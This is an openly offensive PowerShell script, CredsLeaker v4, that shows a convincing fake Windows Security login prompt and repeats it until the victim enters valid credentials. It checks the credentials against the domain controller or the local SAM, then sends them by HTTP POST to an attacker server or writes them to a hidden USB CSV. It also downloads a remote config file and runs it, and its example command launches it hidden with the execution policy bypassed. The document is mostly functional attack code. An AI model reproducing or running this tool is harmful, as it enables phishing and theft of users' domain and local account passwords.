<# .SYNOPSIS Credentials Leaker v4 Main Author: Dviros 
Feature Edits from v3 to v4: apsec 
Required Dependencies: None 
Optional Dependencies: None 

.DESCRIPTION Credsleaker allows an attacker to craft a highly convincing credentials prompt using Windows Security, validate it against the DC and Local SAM and in turn leak it via an HTTP request or export to USB. It also has dynamic export and timer features to allow for different attack scenerios. 

.PARAMETER Caption Message box title. 

.PARAMETER Message Message box message. 

.PARAMETER Server External web server IP or FQDN. 

.PARAMETER Port Web Server's Port - SSL Breaks Usage 

.PARAMETER Delivery Leaked Credentials delivery method. Valid entries: usb/http 

.PARAMETER Filename The path and filename of csv file if using USB Delivery. Entry Syntax: "\PATH\FILENAME.CSV" . Note: the leading \ is necessary. 

.PARAMETER usblabel Label of usb drive. 

.PARAMETER mode dynamic, static, config. Dynamic - If USB Drive/Path are valid, script defaults here, else it uses HTTP POST. Static - Uses default param or Pipeline Delivery method. If Delivery Method is USB but given usblabel is not found, it waits in the background until it is, then writes credentials to CSV. Config - Defines all Params from a given config file. 

.PARAMETER timer Timer is how many minutes the script waits after loading itself to memory before presenting the Credentials PopUp. This is designed to be used primarily in a HID type attack. 

.PARAMETER override Override simply overrides local/remote config files with pipeline or default parameters. Valid entry: override 

.EXAMPLE Powershell.exe -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file "CredsLeaker.ps1" -Caption "Sign in" -Message "Enter your credentials" -Server "malicious.com" -Port "8080" 

.LINK https://github.com/Dviros/CredsLeaker 
https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol 
https://www.bleepingcomputer.com/news/security/psa-beware-of-windows-powershell-credential-request-prompts/ 

#>


param (
    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$Caption = 'Sign in',

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$Message = 'Enter your credentials',

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$Server = "YOUR_URL/cl_reader.php?",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$Port = "80",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$delivery = "http",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$filename = "\cl_loot\creds.csv",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$usblabel = "YOURUSB",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$mode = "dynamic",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$timer = $null,

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$override = $null
)

# Find and Load config file. Default to local if available but switches to web config if local not found. Can manually set Local or Web
#by setting mode and delivery options respectiviley

if ([string]::IsNullOrEmpty($override)) {
    $temp = $env:TEMP
    $volumes = get-volume | where-Object { $_.DriveType -contains "Removable" } | select DriveLetter
    foreach ($drive in $volumes.driveletter) {
        if (test-path -path $drive":\config.cl") {
            Copy-Item -Path $drive":\config.cl" -Destination $temp"cl_params.ps1"
            $path = $drive
        }
    }
}

if ([string]::IsNullOrEmpty($path)) {
    Invoke-RestMethod -uri "https://apsec.dev/scripts/credtrojan/config.cl" -OutFile $temp"\cl_params.ps1"
}
# If being used, load config file
if (Test-Path -Path $temp"cl_params.ps1") {
    . $temp"\cl_params.ps1"
}
# Set Mode - Static, Dynamic, or Config File

switch ($mode) {
    static { $method = $delivery }
    config { <# I do not think this will be configured here #> }
    dynamic {
        if ($path) {
            if (test-path -Path $path) { $method = "usb" }
            else { $method = "http" }
        }
        else { $method = "http" }
    }

}

# Time delay before deployment?

if ($timer) {
    $timer = ($timer -as [int])*60
    Start-Sleep -s $timer
}
# Add Assemblies and Initiate Count Down
Add-Type -AssemblyName System.Runtime.WindowsRuntime
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[Windows.Security.Credentials.UI.CredentialPicker, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerResults, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
[Windows.Security.Credentials.UI.AuthenticationProtocol, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerOptions, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$CurrentDomain_Name = $env:USERDOMAIN
$ComputerName = $env:COMPUTERNAME

# For our While loop
$status = $true


# There are 6 different authentication protocols supported.
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.AuthenticationProtocol = 0
$options.Caption = $Caption
$options.Message = $Message
$options.TargetName = "1"


# CredentialPicker is using Async so we will need to use Await
function Await($WinRtTask, $ResultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
    $netTask = $asTask.Invoke($null, @($WinRtTask))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}

function Leaker($domain, $username, $password, $ComputerName) {
    try {
        switch ($method) {
            usb {
                if ([string]::isnullorempty($path)) {
                    # To prevent throwing a duplicate event error if process repeats without a clean exit - mostly here for debugging
                    Unregister-Event -SourceIdentifier volumeChange -ErrorAction SilentlyContinue
                    # Setup wait event and wait for drive to be inserted
                    Register-WmiEvent -Class win32_VolumeChangeEvent -SourceIdentifier volumeChange
                    do {
                        $newEvent = Wait-Event -SourceIdentifier volumeChange
                        $eventType = $newEvent.SourceEventArgs.NewEvent.EventType
                        if ($eventType -eq 2) {
                            $driveLetter = $newEvent.SourceEventArgs.NewEvent.DriveName
                            $driveLabel = ([wmi]"Win32_LogicalDisk='$driveLetter'").VolumeName
                            # If correct drive, it's go time...
                            if ($driveLabel -eq $usblabel) {
                                $path = $driveLetter
                            }
                        }
                        Remove-Event -SourceIdentifier volumeChange
                    } while ($driveLabel -ne $usblabel)
                    Unregister-Event -SourceIdentifier volumeChange
                }
                New-Object -TypeName PSCustomObject -Property @{
                    Username = $username
                    Password = $password
                    Domain   = $domain
                    Computer = $ComputerName
                } | Select-Object Username, Password, Computer, Domain | Export-Csv -Path $path$filename -NoTypeInformation -Append
                remove-item -path $env:temp"cl_params.ps1"

            }

            http {
                $post = @{username = $username; password = $password; domain = $domain; computer = $env:COMPUTERNAME }
                Invoke-WebRequest -UseBasicParsing $Server -method POST -Body $post -ErrorAction Ignore
                remove-item -path $env:temp"cl_params.ps1"
            }
        }
    }
    catch { }
}

function Credentials() {
    while ($status) {

        # Where the magic happens
        $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
        if ([string]::isnullorempty($creds.CredentialPassword)) {
            Credentials
        }
        if ([string]::isnullorempty($creds.CredentialUserName)) {
            Credentials
        }
        else {
            $Username = $creds.CredentialUserName;
            $Password = $creds.CredentialPassword;
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)

            if ([string]::isnullorempty($domain.name) -eq $true) {
                $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:COMPUTERNAME)
                if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true) {
                    $domain = "Local"
                    leaker $domain $username $password $ComputerName
                    $status = $false
                    exit
                }
                else {
                    Credentials
                }
            }

            if ([string]::isnullorempty($domain.name) -eq $false) {
                leaker $CurrentDomain_Name $username $password $ComputerName
                $status = $false
                exit
            }
            else {
                Credentials
            }
        }
    }
}

Credentials